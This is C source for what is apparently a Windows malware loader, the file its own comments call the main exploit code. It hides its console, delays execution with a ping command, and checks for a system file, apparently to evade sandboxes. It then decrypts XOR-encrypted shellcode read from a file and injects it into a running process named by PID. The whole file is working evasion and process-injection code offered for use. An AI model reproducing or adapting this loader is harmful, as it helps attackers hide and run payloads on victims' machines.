//main exploic code
// this will load the encrypted shellcode and key form file and decrypt on runtime and store it in memory
//then inject the decryped shellcode into a legit windows process


//argument list
//argv[1] : File name of encrypted shellcode
//argv[2] : File name of key
//argv[3] : pid of the process to inject code

#include<stdio.h>
#include<conio.h>
#include<windows.h>
#include<string.h>
#include<stdlib.h>
#include "headers/file_handler.h"
#include "headers/injector.h"
#include "headers/xor_decoder.h"


//function to hide console
void hideconsole(){
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
    
}


int main(int argc,char **argv){
    //hide the console
    hideconsole();

    //sleep for 30 seconds
    
    char time[] = "60";
    char *ping_command = "ping 127.0.0.1 -n ";
    char *complete_command = (char *)malloc(strlen(ping_command) + strlen(time) + 1);
    strcpy(complete_command,ping_command);
    strcat(complete_command,time);
    system(complete_command);
    free(complete_command); 

    char name[] = "c:\\windows\\system.ini";
    FILE *fp = fopen(name,"rb");
    if(fp == NULL){
        printf("[*]File can not be open");
        exit(0);
    }

    fclose(fp);


    int payload_size;
    int key_size;

    //printf("[*]Decoding xor");

    //read enc payload from file
    //printf("\n[*]Reading encrypted payload form %s\n",argv[1]);
    unsigned char *ciphertext=data_from_file(argv[1],&payload_size);
    //printf("[*]payload size is: %d",payload_size);

    //read raw key from file
    //printf("\n[*]Reading key from %s\n",argv[2]);
    unsigned char *key=data_from_file(argv[2],&key_size);
    //printf("[*]KeySize is: %d\n",key_size);

    //decode the payload
    unsigned char *plaintext = (unsigned char *) malloc(payload_size);
    decode_xor(ciphertext,payload_size,key,key_size,plaintext);

    //execution
    //printf("[*]Loading shellcode into memory");
    //printf("\n[*]Executing shellcode\n");

    //exec_shellcode64(plaintext,payload_size);
    
    inject_shellcode(plaintext,payload_size,argv[3]);
    

    //getch();
    return 0;

}
